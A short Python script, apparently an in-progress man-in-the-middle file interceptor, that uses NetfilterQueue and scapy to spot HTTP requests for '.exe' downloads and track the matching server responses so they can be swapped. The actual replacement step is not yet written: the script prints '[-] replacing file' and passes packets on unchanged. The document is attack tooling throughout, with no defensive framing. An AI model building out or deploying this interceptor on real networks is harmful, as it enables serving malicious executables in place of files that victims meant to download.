#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:

            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[-] replacing file")
            print(scapy_packet.show())

    packet.accept()


queue = NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
